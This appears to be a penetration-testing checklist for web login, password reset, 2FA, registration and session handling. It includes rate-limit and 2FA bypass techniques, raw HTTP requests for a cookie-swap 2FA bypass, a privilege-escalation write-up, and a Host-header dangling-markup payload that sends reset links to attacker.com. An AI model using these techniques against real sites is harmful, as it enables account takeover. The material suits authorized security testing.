***
### Forgot password testing
- Failure to validate session on Logout and Password reset
- Check if forget password reset link/code uniqueness
- Check if reset link does get expire or not if its not used by the user for certain amount of time
- Find user account identification parameter and tamper `ID` or `Parameter` value to change other user's password
- Check for weak password policy
- Weak password reset implementation Token is not validated after use
- If reset link has another param such as date and time, then. Change date and time value in order to make active & valid reset link.
- Check if security questions are asked?
	- How many guesses allowed?
	- Lookout policy maintained or not?
- Add only spaces in new password and confirmed password. Then hit enter and see the result
- Does it display old password on the same page after completion of forget password formality?
- Ask for two password reset link and use the older on from user's email

---
### Authentication
- Username enumeration
- Bypass authentication using various SQL injection on username and password field
- Lack of password confirmation on
	- Change email address
	- Change password
	- Manage 2FA
- Is it possible to use resources with authentication? Access violation
- Check if user credential are transmitted over SSL or not
- Weak login function HTTP and HTTPS both are available
	- Test user account lockout mechanism on brute force attack
	- Variation: If server blocks instant user requests, then try with time throttle option from intruder and repeat process again.
	- Bypass rate limiting by tampering user agent to `Mobile User Agent`
	- Bypass rate limiting by tampering user agent to `Anonymous user agent`
	- Bypass rate limiting by using null byte
- Create a password using `cewl` command
- Test Oauth login functionality
	- Oauth Roles
		- Resource owner -> user
		- Resource server -> twitter
		- Client application -> `twitterdeck.com`
		- Authorization server -> twitter
- Bypass rate limit with `X-Forwarded-For:` to pwn authentication
- Host header injection in forget password page
- Test remember me functionality
- Test password reset and/or recovery
	**2FA Bypass**
	- Access the content directly (`site.com/prifle`)
	- Login using Oauth gmail or Facebook to bypass 2FA
	- Reset password and login into the account to bypass 2FA
	- Use old token or change the response
- Go to the rest password page and add two emails while sending the reset password link (You could receive two password reset links)
- Web cache deception (`site.com/file/ok.css`)
- Php protection can be bypassed using `[]` such as `password=123` -> `password[]=` (CSRF tokens too)
- While resetting password change the host header to your server (VPS) = secret link to your VPS
- Bypass rate limit protection: Change system IP per request
- `#Password` reset poisoning via **dangling markup**
	- `Host: victim.com'<a href="//attacker.com/?`
- Add `X-Forwarded-For: 127.0.0.1` or `1-1000` to bypass the rate limit protection
- Login into the valid account and then into then invalid one, repeat this process to fool the server to bypass the rate limit protection (Observe that your IP blocked if you submit 3 incorrect logins in a row However, you can reset the counter by logging in yo your own account before the limit is reached)
- Replace the single string value of the password with an array of strings containing all of the candidate passwords. For example:
```json
"usernae":"test_account",
"password":[
	"123456",
	"password",
	"qwerty",
	...
]
```
- if you enter the wrong code twice, you'll be logged you again bypass it using macros (You need to use Burp's session handling features to log back in automatically before sending each request)

---

1. After signup, I could only access the organization as a `VIEWER`
2. FOUND and endpoint where API KEYS for the organisation were created
3. Google'd the required parameters and it required the following parameters:
```json
{"name":"test", "scope":["viewer"]}
```
4. `scope` could be either `viewer` or `admin` but both gave me 403 forbidden
5. Sent an empty array such as `"scope":[]`
6. API key was generated having full access to the organization
7. Using the key, I changed my role from `VIEWER` to `ADMIN` and had full control over the organization

---
### Bypassing two-factor authentication

Flawed two-factor verification logic sometimes flawed logic in two-factor authentication means that after a user has completed the initial login step, the website does't adequately verify that same user is completing the second step for example, the user logs with their normal credentials in the first step as follows:
```http
POST /login-steps/first HTTP/1.1
Host: vulnerable-website.com
...
username=carlos&password=qwerty
```
They are then assigned a cookie that relates to their account, before being taken to the second step of the login process:
```http
HTTP/1.1 OK
Set-Cookie: account=carlos
```
```http
GET /login-steps/second HTTP/1.1
Cookie: account=carlos
```
When submitting the verification code, the request users this cookie to determine which account the user is trying to access:
```http
POST /login-steps/second HTTP/1.1
Host: vulnerable-website.com
Cookie: account=carlos
...
verification-code=123456'
```
In this case, an attacker could log in using their own credentials but then change the value of the account cookie to any arbitrary username when submitting the verification code.
```http
POST /login-steps/second HTTP/1.1
Host: vulnerable-website.come
Cookie: account=victim-user
...
verification-code=123456
```

---
### Common password reset vulnerabilities
1. Password reset poisoning
2. Predictable reset Tokens
3. Expired token reuse
4. Missing or weak email verification
5. Token Leakage in referer header
6. Unprotected password reset forms

---
### Password reset functionality bugs:
- No rate limiting on password reset
- Password reset link not expiring
- Password reset with manipulating email parameter
- Password reset token leak via refer
- Password reset poisoning
- Response manipulation
- Password reset token leaked in response
- Brute force password reset token/OPT
- Use attacker account password reset token to reset victim account
- Self-XSS in password reset functionality
- Change in referer lead to malicious hyperlink in email
---
### Registration feature testing
- Check for duplicate registration/overwrite existing user
- Check for weak password policy
- Check for reuse existing usernames
- Check for insufficient email verification process
- Weak registration implementation-Allow disposable email address
- Weak registration implementation-over HTTP
- Overwrite default web application pages by specially crafted username registrations - after registration does your profile link appear something as `www.example.com/user`
	- If so, enumerate default folders of web application such as `/images`, `/contact`, `portfolio`
	- Do a registration using the username such as images, contact, portfolio
	- Check if those default folders have been overwritten by your profile link or not
---
### Session Management Testing
- Identify actual session cookie out of bulk cookies in the application
- Decode cookies using some standard decoding algorithms such as Base64, hex, URL, etc
- Modify **cookie.session** token value, by 1 bit/byte. Then resubmit and do the same for all tokens. Reduce the amount of work you need to perform in order to identify which part of the token is actually being used and which is not
- If self-registration is available and you can choose your username, log in with a series of similar username containing small variations between them, such as A, AA, AAA, AAAB, AAAC, AABA, and so on. If another user-specific data is submitted at login or stored in user profile (such as an email address)
- Check for session cookies and cookie expiration date/time
- Identify cookie domain scope
- Check for HttpOnly flag in cookie
- Check for secure flag in cookie if the application over SSL
- Check for session fixation i.e. value of session cookie before and after authentication
- Replay the session cookie from a different effective IP address or system to check whether the server maintains the state of the machine or not
- Check for concurrent login through different machine/IP
- Check if any user pertaining information is stored in cookie value or not if yes, tamper it with other user's data
- Failure to invalidate session on (Email Change, 2FA Activation)
---
